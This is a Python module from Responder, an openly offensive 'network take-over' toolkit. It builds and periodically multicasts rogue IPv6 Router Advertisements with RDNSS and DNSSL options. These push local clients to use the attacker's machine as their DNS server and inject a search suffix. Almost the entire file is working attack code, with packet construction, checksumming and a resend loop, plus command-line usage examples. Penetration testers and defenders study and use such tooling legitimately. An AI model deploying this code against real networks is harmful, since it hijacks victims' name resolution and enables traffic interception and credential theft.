#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
RDNSS/DNSSL Poisoner - DNS Router Advertisement Options (RFC 8106)

Sends IPv6 Router Advertisements with:
- RDNSS (Recursive DNS Server) option - advertises Responder as DNS server
- DNSSL (DNS Search List) option - injects DNS search suffix

Both options are independent and can be used separately or together.

This causes IPv6-enabled clients to:
- Use Responder's DNS server for name resolution (RDNSS)
- Append search suffix to unqualified names (DNSSL)

Usage:
    python Responder.py -I eth0 --rdnss -v              # RDNSS only
    python Responder.py -I eth0 --dnssl corp.local -v   # DNSSL only
    python Responder.py -I eth0 --rdnss --dnssl corp.local -v  # Both
"""

import socket
import struct
import random
import time
import signal
from utils import *

# ICMPv6 Constants
ICMPV6_ROUTER_ADVERTISEMENT = 134
ICMPV6_HOP_LIMIT = 255

# DNS RA Option Types (RFC 8106)
ND_OPT_RDNSS = 25  # Recursive DNS Server
ND_OPT_DNSSL = 31  # DNS Search List

# IPv6 All-Nodes Multicast Address
IPV6_ALL_NODES = "ff02::1"

# RA Timing (seconds)
RA_INTERVAL_MIN = 30
RA_INTERVAL_MAX = 120
RA_LIFETIME = 1800  # 30 minutes


class RDNSSOption:
    """Recursive DNS Server Option (Type 25)"""
    
    def __init__(self, dns_servers, lifetime=RA_LIFETIME):
        self.dns_servers = dns_servers if isinstance(dns_servers, list) else [dns_servers]
        self.lifetime = lifetime
    
    def build(self):
        if not self.dns_servers:
            return b''
        
        addresses = b''
        for server in self.dns_servers:
            addresses += socket.inet_pton(socket.AF_INET6, server)
        
        # Length in units of 8 octets: 1 (header) + 2 * num_addresses
        length = 1 + (2 * len(self.dns_servers))
        
        header = struct.pack(
            '!BBHI',
            ND_OPT_RDNSS,
            length,
            0,              # Reserved
            self.lifetime
        )
        
        return header + addresses


class DNSSLOption:
    """DNS Search List Option (Type 31)"""
    
    def __init__(self, domains, lifetime=RA_LIFETIME):
        self.domains = domains if isinstance(domains, list) else [domains]
        self.lifetime = lifetime
    
    @staticmethod
    def encode_domain(domain):
        """Encode domain name in DNS wire format (RFC 1035)."""
        encoded = b''
        for label in domain.rstrip('.').split('.'):
            label_bytes = label.encode('ascii')
            encoded += bytes([len(label_bytes)]) + label_bytes
        encoded += b'\x00'  # Root label
        return encoded
    
    def build(self):
        if not self.domains:
            return b''
        
        domain_data = b''
        for domain in self.domains:
            domain_data += self.encode_domain(domain)
        
        # Pad to 8-octet boundary
        header_size = 8
        total_size = header_size + len(domain_data)
        padding_needed = (8 - (total_size % 8)) % 8
        domain_data += b'\x00' * padding_needed
        
        length = (header_size + len(domain_data)) // 8
        
        header = struct.pack(
            '!BBHI',
            ND_OPT_DNSSL,
            length,
            0,              # Reserved
            self.lifetime
        )
        
        return header + domain_data


class RouterAdvertisement:
    """ICMPv6 Router Advertisement Message"""
    
    def __init__(self, rdnss=None, dnssl=None, managed=False, other=False, router_lifetime=0):
        self.cur_hop_limit = 64
        self.managed_flag = managed
        self.other_flag = other
        self.router_lifetime = router_lifetime  # 0 = not a default router
        self.reachable_time = 0
        self.retrans_timer = 0
        self.rdnss = rdnss
        self.dnssl = dnssl
    
    def build(self):
        flags = 0
        if self.managed_flag:
            flags |= 0x80
        if self.other_flag:
            flags |= 0x40
        
        ra_header = struct.pack(
            '!BBHBBHII',
            ICMPV6_ROUTER_ADVERTISEMENT,
            0,                          # Code
            0,                          # Checksum (placeholder)
            self.cur_hop_limit,
            flags,
            self.router_lifetime,
            self.reachable_time,
            self.retrans_timer
        )
        
        options = b''
        if self.rdnss:
            options += self.rdnss.build()
        if self.dnssl:
            options += self.dnssl.build()
        
        return ra_header + options


def compute_icmpv6_checksum(source, dest, icmpv6_packet):
    """Compute ICMPv6 checksum including pseudo-header."""
    src_addr = socket.inet_pton(socket.AF_INET6, source)
    dst_addr = socket.inet_pton(socket.AF_INET6, dest)
    
    pseudo_header = struct.pack(
        '!16s16sI3xB',
        src_addr,
        dst_addr,
        len(icmpv6_packet),
        58  # ICMPv6
    )
    
    data = pseudo_header + icmpv6_packet
    if len(data) % 2:
        data += b'\x00'
    
    checksum = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        checksum += word
    
    while checksum >> 16:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    return ~checksum & 0xFFFF


def get_link_local_address(interface):
    """Get link-local IPv6 address for interface (required for RA source)."""
    try:
        with open('/proc/net/if_inet6', 'r') as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 6 and parts[5] == interface:
                    addr = parts[0]
                    formatted = ':'.join(addr[i:i+4] for i in range(0, 32, 4))
                    if formatted.lower().startswith('fe80'):
                        return formatted
    except FileNotFoundError:
        pass
    
    # Fallback: try netifaces
    try:
        import netifaces
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET6 in addrs:
            for addr in addrs[netifaces.AF_INET6]:
                ipv6 = addr.get('addr', '').split('%')[0]
                if ipv6.lower().startswith('fe80'):
                    return ipv6
    except:
        pass
    
    return None


def get_dns_server_address(interface):
    """Get IPv6 address to advertise as DNS server. Uses Bind_To6 from settings."""
    # Use Bind_To6 from settings (set via -6 option or config)
    if hasattr(settings.Config, 'Bind_To6') and settings.Config.Bind_To6:
        return settings.Config.Bind_To6
    
    # Fallback: auto-detect from interface
    try:
        import netifaces
        addrs = netifaces.ifaddresses(interface)
        if netifaces.AF_INET6 in addrs:
            global_ipv6 = None
            linklocal_ipv6 = None
            
            for addr in addrs[netifaces.AF_INET6]:
                ipv6 = addr.get('addr', '').split('%')[0]
                if not ipv6 or ipv6 == '::1':
                    continue
                
                if ipv6.lower().startswith('fe80'):
                    if not linklocal_ipv6:
                        linklocal_ipv6 = ipv6
                else:
                    if not global_ipv6:
                        global_ipv6 = ipv6
            
            # Prefer global, fall back to link-local
            return global_ipv6 or linklocal_ipv6
    except:
        pass
    
    # Last resort: link-local
    return get_link_local_address(interface)


def send_ra(interface, source_ip, dns_server=None, dnssl_domains=None):
    """Send a single Router Advertisement."""
    try:
        # Build RDNSS option if DNS server specified
        rdnss = None
        if dns_server:
            rdnss = RDNSSOption(dns_servers=[dns_server], lifetime=RA_LIFETIME)
        
        # Build DNSSL option if domains specified
        dnssl = None
        if dnssl_domains:
            dnssl = DNSSLOption(domains=dnssl_domains, lifetime=RA_LIFETIME)
        
        # Build RA packet
        ra = RouterAdvertisement(rdnss=rdnss, dnssl=dnssl)
        
        # Create raw socket
        sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, ICMPV6_HOP_LIMIT)
        sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_UNICAST_HOPS, ICMPV6_HOP_LIMIT)
        
        # Build packet with checksum
        packet = bytearray(ra.build())
        checksum = compute_icmpv6_checksum(source_ip, IPV6_ALL_NODES, bytes(packet))
        struct.pack_into('!H', packet, 2, checksum)
        
        # Send to all-nodes multicast
        sock.sendto(bytes(packet), (IPV6_ALL_NODES, 0, 0, socket.if_nametoindex(interface)))
        sock.close()
        
        return True
        
    except PermissionError:
        print(color("[!] ", 1, 1) + "RDNSS: Root privileges required for raw sockets")
        return False
    except OSError as e:
        if settings.Config.Verbose:
            print(color("[!] ", 1, 1) + "RDNSS error: %s" % str(e))
        return False


def RDNSS(interface, rdnss_enabled, dnssl_domain):
    """
    RDNSS/DNSSL Poisoner - Main entry point
    
    Sends periodic Router Advertisements with DNS options:
    - RDNSS: Advertises Responder as DNS server (--rdnss)
    - DNSSL: Injects DNS search suffix (--dnssl)
    
    Both options are independent and can be used separately or together.
    
    Args:
        interface: Network interface to send RAs on
        rdnss_enabled: If True, include RDNSS option (DNS server)
        dnssl_domain: If set, include DNSSL option (search suffix)
    """
    # Get source address (must be link-local for RAs per RFC 4861)
    source_ip = get_link_local_address(interface)
    if not source_ip:
        print(color("[!] ", 1, 1) + "RDNSS: Could not get link-local address for %s" % interface)
        return
    
    # Get DNS server address if RDNSS is enabled
    dns_server = None
    if rdnss_enabled:
        dns_server = get_dns_server_address(interface)
        if not dns_server:
            print(color("[!] ", 1, 1) + "RDNSS: Could not determine IPv6 address for DNS server")
            return
    
    # Format DNSSL domain
    domains = None
    if dnssl_domain:
        domains = [dnssl_domain] if isinstance(dnssl_domain, str) else dnssl_domain
    
    # Startup messages
    if dns_server:
        print(color("[*] ", 2, 1) + "RDNSS advertising DNS server: %s" % dns_server)
    if domains:
        print(color("[*] ", 2, 1) + "DNSSL advertising search domain: %s" % ', '.join(domains))
    print(color("[*] ", 2, 1) + "Sending RA every %d-%d seconds" % (RA_INTERVAL_MIN, RA_INTERVAL_MAX))
    print(color("[*] ", 2, 1) + "Avoid self poisoning with: \"sudo ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement -j DROP\"")
    
    # Send initial RA
    send_ra(interface, source_ip, dns_server, domains)
    
    # Main loop - send RAs at random intervals
    while True:
        interval = random.randint(RA_INTERVAL_MIN, RA_INTERVAL_MAX)
        time.sleep(interval)
        send_ra(interface, source_ip, dns_server, domains)
